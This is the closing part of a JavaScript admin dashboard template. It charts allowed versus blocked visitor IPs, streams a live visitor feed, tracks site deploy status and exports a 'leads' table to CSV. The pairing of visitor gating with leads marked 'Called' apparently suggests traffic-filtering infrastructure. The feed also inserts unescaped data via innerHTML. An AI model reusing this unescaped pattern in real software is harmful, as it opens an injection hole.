  var dc = document.getElementById('donutCanvas');
  if (dc) {
    var ctx = dc.getContext('2d');
    var allow = ${allAllow}, block = ${allBlock}, total = allow + block;
    if (total === 0) { allow = 1; total = 1; }
    var blockAngle = (block / total) * Math.PI * 2;
    var r = 70, cx = 80, cy = 80, thick = 18;
    ctx.clearRect(0, 0, 160, 160);
    // Block arc
    ctx.beginPath(); ctx.arc(cx, cy, r, -Math.PI/2, -Math.PI/2 + blockAngle); ctx.lineWidth = thick; ctx.strokeStyle = '#ef4444'; ctx.lineCap = 'butt'; ctx.stroke();
    // Allow arc
    ctx.beginPath(); ctx.arc(cx, cy, r, -Math.PI/2 + blockAngle, -Math.PI/2 + Math.PI*2); ctx.lineWidth = thick; ctx.strokeStyle = '#22c55e'; ctx.lineCap = 'butt'; ctx.stroke();
    // Inner bg
    ctx.beginPath(); ctx.arc(cx, cy, r - thick/2 - 2, 0, Math.PI*2); ctx.fillStyle = '#0f0022'; ctx.fill();
  }

  // Bar chart
  var bc = document.getElementById('barCanvas');
  if (bc) {
    var wrap = document.getElementById('barChartWrap');
    if (wrap) { bc.width = wrap.clientWidth || 400; bc.height = 150; }
    var ctx2 = bc.getContext('2d');
    var allowD = ${hourlyAllowJson};
    var blockD = ${hourlyBlockJson};
    var maxV = Math.max(1, Math.max.apply(null, allowD.map(function(v,i){ return v + blockD[i]; })));
    var bw = Math.floor((bc.width - 40) / 24);
    var h = bc.height - 24;
    ctx2.clearRect(0, 0, bc.width, bc.height);
    for (var i = 0; i < 24; i++) {
      var x = 20 + i * bw;
      var aH = Math.round((allowD[i] / maxV) * h);
      var bH = Math.round((blockD[i] / maxV) * h);
      // allow bar
      if (aH > 0) { ctx2.fillStyle = 'rgba(34,197,94,.7)'; ctx2.fillRect(x+2, h - aH, bw-5, aH); }
      // block bar on top
      if (bH > 0) { ctx2.fillStyle = 'rgba(239,68,68,.7)'; ctx2.fillRect(x+2, h - aH - bH, bw-5, bH); }
      // hour label every 4h
      if (i % 4 === 0) { ctx2.fillStyle = '#4e3d70'; ctx2.font = '9px system-ui'; ctx2.textAlign = 'center'; ctx2.fillText(i.toString().padStart(2,'0'), x + bw/2, h + 14); }
    }
    // gridline
    ctx2.strokeStyle = 'rgba(46,18,96,.5)'; ctx2.lineWidth = 1;
    ctx2.beginPath(); ctx2.moveTo(20, h); ctx2.lineTo(bc.width - 10, h); ctx2.stroke();
  }
});

// ── SSE Live feed ─────────────────────────────────────────────────────────────
(function() {
  var activeTimes = ${activeIpTimesJson};
  var feed = document.getElementById('ltFeed');
  var activeEl = document.getElementById('liveCnt');
  var kpiActive = document.getElementById('kpiActive');

  function countActive() {
    var cutoff = Date.now() - 3 * 60 * 1000;
    return Object.values(activeTimes).filter(function(t){ return t > cutoff; }).length;
  }
  function updateCount() {
    var n = countActive();
    if (activeEl) activeEl.textContent = n;
    if (kpiActive) kpiActive.textContent = n;
  }

  function makeLtRow(entry) {
    var dec = entry.decision || '';
    var cls = dec === 'allow' ? 'lt-dec-allow' : 'lt-dec-block';
    var ts = '';
    try { ts = new Date(entry.ts).toLocaleTimeString('en-GB', { timeZone: _tz, hour12:false }); } catch(e) {}
    var row = document.createElement('div');
    row.className = 'lt-row';
    row.innerHTML = '<span class="lt-ts">' + ts + '</span>'
      + '<span class="lt-ip">' + (entry.ip || '') + '</span>'
      + '<span class="' + cls + '">' + dec + '</span>';
    return row;
  }

  if (!window.EventSource) return;
  var es = new EventSource('/admin/events');
  es.onmessage = function(e) {
    var payload, entry;
    try { payload = JSON.parse(e.data); } catch(x) { return; }

    // Handle live deploy status badge updates for sites
    if (payload.type === 'siteStatus') {
      var dsCls = { live:'db-live', pushed:'db-pushed', building:'db-pushed', pending:'db-pending', failed:'db-failed', 'key-rotated':'db-rotated' };
      var dsLabel = { live:'Live', pushed:'GitHub \u2713', building:'Deploying\u2026', pending:'Pending', failed:'Failed', 'key-rotated':'Key Rotated' };
      var slRow = document.querySelector('.sl-row[data-site-id="' + payload.siteId + '"]');
      if (slRow) {
        var badge = slRow.querySelector('.db-live,.db-pushed,.db-pending,.db-failed,.db-rotated');
        if (badge) {
          badge.className = dsCls[payload.status] || 'db-pending';
          badge.textContent = dsLabel[payload.status] || payload.status;
        }
        slRow.setAttribute('data-deploy-status', payload.status);
      }
      return;
    }

    entry = payload.entry || payload;
    if (entry.ip) activeTimes[entry.ip] = Date.now();
    updateCount();

    if (feed) {
      var ph = feed.querySelector('[style]');
      if (ph && ph.style.textAlign) ph.remove();
      var row = makeLtRow(entry);
      feed.insertBefore(row, feed.firstChild);
      var rows = feed.querySelectorAll('.lt-row');
      while (rows.length > 10) { feed.removeChild(feed.lastChild); rows = feed.querySelectorAll('.lt-row'); }
    }

    addNotif(entry);
    // Subtle audio ting
    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var osc = ac.createOscillator(); var gain = ac.createGain();
      osc.connect(gain); gain.connect(ac.destination);
      osc.frequency.value = entry.decision === 'allow' ? 880 : 440;
      gain.gain.setValueAtTime(0.04, ac.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.25);
      osc.start(); osc.stop(ac.currentTime + 0.25);
    } catch(e) {}
  };
  es.onerror = function(){};
})();

// ── Keyboard shortcuts ────────────────────────────────────────────────────────
document.addEventListener('keydown', function(e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
  var map = { '1':'dashboard','2':'sites','3':'logs','4':'leads','5':'settings' };
  if (map[e.key]) {
    var btn = document.querySelector('.sb-link[data-section="' + map[e.key] + '"]');
    navTo(map[e.key], btn);
  }
});

// ── CSV export for leads ──────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', function() {
  var btn = document.getElementById('csvExportBtn');
  if (btn) {
    btn.addEventListener('click', function(e) {
      e.preventDefault();
      var rows = document.querySelectorAll('#sec-leads table tbody tr');
      var csv = ['Time,IP,Country,City,Code,Source,Visitor TZ,Called'];
      rows.forEach(function(row) {
        var cells = row.querySelectorAll('td');
        var vals = Array.from(cells).map(function(c){ return '"' + (c.textContent || '').replace(/"/g,'""').trim() + '"'; });
        csv.push(vals.join(','));
      });
      var blob = new Blob([csv.join('\n')], { type: 'text/csv' });
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a'); a.href = url; a.download = 'leads.csv'; a.click();
      URL.revokeObjectURL(url);
    });
  }
});
</script>
</body>
</html>`;

}

function escHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
